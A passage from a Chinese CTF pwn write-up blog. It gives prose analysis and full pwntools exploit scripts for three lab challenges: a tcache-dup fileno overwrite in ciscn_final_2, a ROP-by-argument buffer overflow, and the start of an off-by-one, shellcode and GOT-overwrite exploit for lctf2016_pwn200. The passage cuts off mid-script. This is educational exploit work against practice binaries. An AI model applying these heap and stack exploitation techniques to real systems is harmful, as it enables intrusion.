punctuation\">)</span>\t\t\t<span class=\"token comment\"># 将重复块弹出 tcache bin，同时使得 bin 指向 target</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\t<span class=\"token comment\"># value 为往 target 写入的数值</span></pre></td></tr></table></figure><h3 id=\"输出函数\"><a class=\"markdownIt-Anchor\" href=\"#输出函数\">#</a> 输出函数</h3>\n<p>无条件以数字形式输出数据。可选择大块或小块。但是输出依旧限制了字节数。同分配函数所写的一般。比如 8 字节的数据 <code>0x1122334455667788</code> ，对于大块则只会输出 <code>0x55667788</code> （小端字节序）。</p>\n<h2 id=\"利用-2\"><a class=\"markdownIt-Anchor\" href=\"#利用-2\">#</a> 利用</h2>\n<p>常规思路是释放大 chunk 获得 libc 地址，然后直接修改 <code>__malloc_hook</code>  或者 <code>__free_hook</code> 。但是由于 execve 被禁用，因此只能利用 orw。但依旧是要先泄露 libc 地址，然后计算得到 stdin 的地址再往 flagno 处写入数值 666。</p>\n<h3 id=\"地址覆盖\"><a class=\"markdownIt-Anchor\" href=\"#地址覆盖\">#</a> 地址覆盖</h3>\n<p>由于我们泄露和修改的字节数固定为 4 字节或 2 字节。由于 64 位程序的地址为 8 字节，因此我们只能进行低位覆盖。由于整型输入的缘故，对于 int 哪怕只输入了 short 范围的数据，也会把 int 中的高 2 位置零或置 0xff。因此泄露和覆盖所用的 chunk 类型应该一致，或者使用 int 泄露，short 修改。</p>\n<p>其次，高位数据无法修改。因此只能在现有的堆块地址或者 mainarena 地址上修改。</p>\n<h3 id=\"泄露libc地址\"><a class=\"markdownIt-Anchor\" href=\"#泄露libc地址\">#</a> 泄露 libc 地址</h3>\n<p>首先得构造 0x400 以上的 chunk 然后释放。因此第一次任意地址读写需要修改某个 chunk 的 size 区域。</p>\n<p>先分配大量 chunk，确保构造的 chunk 拥有与之相邻的 “合法” chunk。然后构造 dup。在构造好 dup 的循环链时，将该循环的 chunk 打印，获得该 chunk 自身的地址。由此推算第一个 chunk 的地址。然后利用 dup 将第一个 chunk 的大小修改为对应的大小。</p>\n<p>为了保存第一个 chunk 的地址，中间用于填充够 0x400 的 chunk 必须为同一类，这里第一个 chunk 为小，其后的 chunk 均为大。同时，由于构造 dup 时需一个不同类配合，因此需要先将这个唯一的小 chunk 释放。</p>\n<h3 id=\"修改flagno\"><a class=\"markdownIt-Anchor\" href=\"#修改flagno\">#</a> 修改 flagno</h3>\n<p>泄露 <code>mainarena+96</code>  的地址后，计算出 <code>_IO_2_1_stdin_</code> 的地址， <code>_IO_2_1_stdin_ + 112</code>  即为 flagno 所在位置。此时利用上一步泄露出来的 mainarena。由于存放的 chunk 是处于 unsorted bin 之中，直接分配一个 chunk，并修改低位数据为 flagno 的地址低位。然后 dup。</p>\n<p>这里 dup 使用的是小块，上一次 dup 用的是大块。** 因为 dup 后 tcache bin 的计数器会变为 - 1，此时释放堆块，-1 会识别为很大的数，超过 8，释放的堆块便会放入 fastbin，无法利用 tcache dup。** 虽然再多次 free 可以使得计数器变为 0，但没有直接换人方便。</p>\n<p>修改好 stdin 的 flagno 之后，直接退出。便完成了 orw。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_final_2'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29938</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1180)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token number\">0x400</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'number:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"31\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span>    <span class=\"token comment\"># 1 or 2</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre></pre></td></tr><tr><td data-num=\"35\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n>'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>    p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'number :'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre></pre></td></tr><tr><td data-num=\"40\"></td><td><pre><span class=\"token comment\"># 泄露 libc 地址</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre><span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>    mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> i<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre></pre></td></tr><tr><td data-num=\"50\"></td><td><pre><span class=\"token comment\"># dup 第一步</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>c33u <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>c0r <span class=\"token operator\">=</span> c33u <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x440</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre></pre></td></tr><tr><td data-num=\"57\"></td><td><pre><span class=\"token comment\"># dup 第二步</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> c0r<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">0x441</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"61\"></td><td><pre></pre></td></tr><tr><td data-num=\"62\"></td><td><pre><span class=\"token comment\"># 此时第一个 chunk 为 0x440 大小的 chunk</span></pre></td></tr><tr><td data-num=\"63\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"64\"></td><td><pre><span class=\"token comment\">#泄露 mainarena+96 后计算</span></pre></td></tr><tr><td data-num=\"65\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"66\"></td><td><pre>lma_ <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"67\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'ma_:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>lma_<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"68\"></td><td><pre>mh_a <span class=\"token operator\">=</span> lma_ <span class=\"token operator\">-</span> <span class=\"token number\">0x70</span></pre></td></tr><tr><td data-num=\"69\"></td><td><pre></pre></td></tr><tr><td data-num=\"70\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span>mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"71\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"72\"></td><td><pre>io_file <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'_IO_2_1_stdin_'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"73\"></td><td><pre>flagno <span class=\"token operator\">=</span> io_file <span class=\"token operator\">+</span> <span class=\"token number\">112</span></pre></td></tr><tr><td data-num=\"74\"></td><td><pre></pre></td></tr><tr><td data-num=\"75\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'mh_a:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>mh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"76\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'stdin:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>io_file<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"77\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'c0r:'</span><span class=\"token operator\">+</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span>c0r<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"78\"></td><td><pre></pre></td></tr><tr><td data-num=\"79\"></td><td><pre>c3u <span class=\"token operator\">=</span> c0r <span class=\"token operator\">+</span> <span class=\"token number\">0x30</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x20</span> <span class=\"token operator\">+</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"80\"></td><td><pre>fake_fd <span class=\"token operator\">=</span> c0r <span class=\"token operator\">+</span> <span class=\"token number\">0x18</span></pre></td></tr><tr><td data-num=\"81\"></td><td><pre><span class=\"token comment\"># 修改 mainarena 后两位</span></pre></td></tr><tr><td data-num=\"82\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> flagno<span class=\"token punctuation\">)</span> <span class=\"token comment\"># for after dup</span></pre></td></tr><tr><td data-num=\"83\"></td><td><pre></pre></td></tr><tr><td data-num=\"84\"></td><td><pre><span class=\"token comment\"># dup</span></pre></td></tr><tr><td data-num=\"85\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"86\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"87\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"88\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"89\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> fake_fd<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"90\"></td><td><pre></pre></td></tr><tr><td data-num=\"91\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"92\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"93\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">666</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"94\"></td><td><pre></pre></td></tr><tr><td data-num=\"95\"></td><td><pre>choose<span class=\"token punctuation\">(</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"96\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121004242056.png\" alt=\"image-20231121004242056\"></p>\n<h1 id=\"picoctf_2018_buffer_overflow_0\"><a class=\"markdownIt-Anchor\" href=\"#picoctf_2018_buffer_overflow_0\">#</a> *PicoCTF_2018_buffer_overflow_0</h1>\n<p>** 考点：** 调用程序传参，ssh, stack overflow</p>\n<p>这题考的是给程序传参。在 pwntools 中，使用 <code>process(argv=['./pwn', payload])</code>  可以将参数传入。</p>\n<p>题目将 flag 读入了.bss 段，因此只要构造输出的 rop 链即可。</p>\n<p>因为用到程序传参，所以这题需要远程 ssh 登陆靶机后操作。登陆后将 exp 代码复制过去然后执行。</p>\n<figure class=\"highlight bash\"><figcaption data-lang=\"bash\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token function\">ssh</span> CTFMan@node4.buuoj.cn <span class=\"token parameter variable\">-p</span> <span class=\"token number\">27087</span>\t<span class=\"token comment\"># 登陆密码 guest</span></pre></td></tr></table></figure><figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'i386'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>e<span class=\"token operator\">=</span>ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>buf <span class=\"token operator\">=</span> <span class=\"token number\">0x804a060</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>puts_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'puts'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>main_a <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>sym<span class=\"token punctuation\">[</span><span class=\"token string\">'main'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>offset <span class=\"token operator\">=</span> <span class=\"token number\">0x018</span><span class=\"token operator\">+</span><span class=\"token number\">4</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>payload <span class=\"token operator\">=</span> <span class=\"token string\">b'a'</span><span class=\"token operator\">*</span>offset <span class=\"token operator\">+</span> flat<span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>puts_p<span class=\"token punctuation\">,</span> main_a<span class=\"token punctuation\">,</span> buf<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>p<span class=\"token operator\">=</span>process<span class=\"token punctuation\">(</span>argv <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'./vuln'</span><span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"./image-20231121081834555.png\" alt=\"image-20231121081834555\"></p>\n<h1 id=\"lctf2016_pwn200\"><a class=\"markdownIt-Anchor\" href=\"#lctf2016_pwn200\">#</a> *lctf2016_pwn200</h1>\n<p>** 考点：**off_by_one, shellcode, got</p>\n<p>**libc 版本：**libc6_2.23</p>\n<h2 id=\"分析-2\"><a class=\"markdownIt-Anchor\" href=\"#分析-2\">#</a> 分析</h2>\n<p>没有任何保护。栈可执行。</p>\n<p><img data-src=\"./image-20231121084234332.png\" alt=\"image-20231121084234332\"></p>\n<p>有两个输入漏洞。</p>\n<ul>\n<li>第一个是输入名字时，若输入的循环因输入数满 48，则会直接退出，不会添加 <code>'\\0'</code>  结束字符。由于之后输出姓名用的是 printf 函数，由此可以将紧邻的 rbp 地址泄露出来。<s>我是不会说我一开始没注意到这个漏洞所以在那修改 got 表凑半天没凑出来的。</s></li>\n</ul>\n<p><img data-src=\"./image-20231121165925670.png\" alt=\"image-20231121165925670\"></p>\n<ul>\n<li>第二个是输入系统分配的第一个 chunk 时，我们可以多输入 8 字节的数据，刚好覆盖到 dest 变量。该变量储存着我们即将写入的地址，所以可以实现任意地址写入。但是由于是使用 strcpy 将读入的数据复制到地址处，所以要注意输入数据内的 <code>'\\0'</code> 。</li>\n</ul>\n<h2 id=\"思路\"><a class=\"markdownIt-Anchor\" href=\"#思路\">#</a> 思路</h2>\n<p>第一步，由于栈可执行，所以输入名字时直接输入 shellcode，然后利用泄露出来的栈地址计算出 shellcode 所在位置。</p>\n<p>~~ 由于 shellcode 长度有限，所以这边自己写。~~ 写 wp 的时候才发现生成的 shellcode 刚好为 48 字节，可以直接利用。如果跟我一样手写的时候，记得必须避开所有 <code>'\\0'</code> 。</p>\n<p><img data-src=\"./image-20231121170703448.png\" alt=\"image-20231121170703448\"></p>\n<p>经计算，泄露的地址减去 <code>0x50</code>  即为 shellcode 所在地址。</p>\n<p><img data-src=\"./image-20231121170956753.png\" alt=\"image-20231121170956753\"></p>\n<p>第二步，将 got 表中 free 的地址修改为 shellcode 所在地址。然后再选择释放块，便可以执行 shellcode 了。想了想，修改 puts 之类的应该夜行？</p>\n<p>以下是手打的 shellcode：</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'pwn200'</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">26425</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span 